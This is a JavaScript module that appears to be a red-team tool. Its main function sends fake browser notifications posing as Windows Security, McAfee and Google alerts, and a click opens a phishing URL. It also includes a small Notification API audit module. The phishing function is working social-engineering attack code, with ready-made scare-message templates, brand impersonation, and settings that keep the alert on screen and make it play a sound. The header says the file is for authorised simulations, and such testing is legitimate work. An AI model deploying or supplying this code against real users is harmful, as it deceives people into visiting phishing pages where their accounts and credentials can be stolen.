/**
 * notification_phish.js — Fake Security Alert Notification Phishing & Audit
 *
 * This module provides:
 *   1. `sendPhishingNotification()` – a weaponized function that crafts a
 *      realistic, system‑level browser notification pretending to be a
 *      security alert and directs the victim to a phishing URL. It handles
 *      permission requests automatically and can be used for authorised
 *      social‑engineering simulations.
 *
 *   2. Default export – a Pinpoint‑compatible `Notification_API_Audit` that
 *      audits the Notification API, current permission state, and maximum
 *      actions supported.
 *
 * Designed exclusively for authorised security assessments and red‑team
 * engagements. Unauthorised phishing is illegal.
 */

// ---------------------------------------------------------------------------
// 1. Phishing notification engine
// ---------------------------------------------------------------------------

/**
 * Default templates for fake security alerts. Each template includes
 * a title, body, and an optional icon (URL or emoji). The phishing URL
 * is passed separately.
 */
const DEFAULT_TEMPLATES = [
    {
        title: '⚠️ Windows Security Alert',
        body: 'Critical threat detected. Click here to remove the virus immediately.',
        icon: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Ccircle cx="50" cy="50" r="45" fill="%23d32f2f"/%3E%3Ctext x="50" y="68" font-size="50" text-anchor="middle" fill="white"%3E!%3C/text%3E%3C/svg%3E',
    },
    {
        title: '🛡️ McAfee – Subscription Expired',
        body: 'Your protection has expired. Renew now to keep your device safe.',
        icon: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect width="100" height="100" rx="15" fill="%23c00"/%3E%3Ctext x="50" y="68" font-size="50" text-anchor="middle" fill="white"%3EM%3C/text%3E%3C/svg%3E',
    },
    {
        title: '🔒 Google Security Alert',
        body: 'Suspicious sign‑in attempt detected. Verify your account immediately.',
        icon: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Ccircle cx="50" cy="50" r="45" fill="%234285f4"/%3E%3Ctext x="50" y="68" font-size="50" text-anchor="middle" fill="white"%3EG%3C/text%3E%3C/svg%3E',
    },
];

/**
 * Sends a phishing notification that mimics a security alert.
 *
 * **Behaviour:**
 *   1. Checks Notification API support and permission state.
 *   2. If permission is "default", requests it (requires a user gesture on some
 *      browsers – this function should be called from a click handler for best
 *      results, but we also provide a fallback silent request).
 *   3. Constructs a notification using the provided or default template.
 *   4. When the user clicks the notification, it opens the phishing URL or
 *      fires an optional callback.
 *
 * @param {Object}   [options={}]
 * @param {string}   [options.phishUrl='https://example.com/fakealert'] – URL to open when notification is clicked.
 * @param {Object}   [options.template]                                – custom { title, body, icon } object.
 * @param {number}   [options.templateIndex=0]                         – use a built‑in template (0‑2).
 * @param {string}   [options.icon]                                    – override icon (URL, data: URI, or emoji).
 * @param {string}   [options.tag]                                     – notification tag (to avoid duplicates).
 * @param {boolean}  [options.requireInteraction=true]                 – keep notification on screen until user interacts.
 * @param {Function} [options.onClick]                                 – callback when notification is clicked (receives the event).
 * @param {Function} [options.onError]                                 – callback on error.
 * @returns {Promise<Notification|null>} the created Notification object, or null if failed.
 */
export async function sendPhishingNotification(options = {}) {
    const {
        phishUrl = 'https://example.com/fakealert',
        template = null,
        templateIndex = 0,
        icon = null,
        tag = 'security-alert',
        requireInteraction = true,
        onClick = null,
        onError = null,
    } = options;

    // 1. Check support
    if (!('Notification' in window)) {
        const err = 'Notification API not supported.';
        if (onError) onError(new Error(err));
        console.warn('[notification_phish]', err);
        return null;
    }

    // 2. Handle permission
    let permission = Notification.permission;
    if (permission === 'denied') {
        const err = 'Notification permission denied by user.';
        if (onError) onError(new Error(err));
        console.warn('[notification_phish]', err);
        return null;
    }

    if (permission === 'default') {
        // Request permission. This MUST be called from a user gesture in
        // most modern browsers. If not, the promise will reject/be ignored.
        try {
            permission = await Notification.requestPermission();
        } catch (e) {
            if (onError) onError(e);
            console.warn('[notification_phish] Permission request failed:', e);
            return null;
        }
        if (permission !== 'granted') {
            if (onError) onError(new Error('Permission not granted.'));
            return null;
        }
    }

    // 3. Choose template
    const tmpl = template || DEFAULT_TEMPLATES[templateIndex] || DEFAULT_TEMPLATES[0];
    const finalIcon = icon || tmpl.icon;

    // 4. Create notification
    const notifOptions = {
        body: tmpl.body,
        icon: finalIcon,
        tag: tag,
        requireInteraction: requireInteraction,
        // Modern browsers support `data` property for arbitrary data
        data: { phishUrl },
    };

    // If `silent` is false, it plays a sound – more alarming.
    // We'll set silent: false to attract attention.
    notifOptions.silent = false;

    let notification;
    try {
        notification = new Notification(tmpl.title, notifOptions);
    } catch (e) {
        if (onError) onError(e);
        console.error('[notification_phish] Failed to create notification:', e);
        return null;
    }

    // 5. Attach click handler
    const clickHandler = function (event) {
        // If onClick callback provided, call it and prevent default navigation?
        if (onClick) {
            onClick(event);
        }
        // Open the phishing URL in a new tab (or same)
        // Use window.open to avoid popup blockers (synchronous inside click)
        try {
            window.open(phishUrl, '_blank', 'noopener');
        } catch (e) {
            // Fallback: navigate current window (worse for stealth)
            // window.location.href = phishUrl;
        }
        // Close the notification after click
        event.target.close();
    };

    notification.addEventListener('click', clickHandler);

    // Optional: close after a timeout (if not requireInteraction)
    if (!requireInteraction) {
        setTimeout(() => {
            if (notification) notification.close();
        }, 10000); // 10 seconds
    }

    return notification;
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Notification_API_Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'notification_phish',
    title: 'Notification_API_Audit',
    level: 6,
    info: 'Audits Web Notification API support and current origin notification permission state.',
    steps: [
        'Check window.Notification existence.',
        'Read Notification.permission state.',
    ],
    run: async () => {
        const supported = 'Notification' in window;
        return {
            notificationApiSupported: supported,
            permissionState: supported ? Notification.permission : 'unsupported',
            maxActionsSupported: supported && Notification.maxActions ? Notification.maxActions : 0,
        };
    },
};

export default pinpointModule;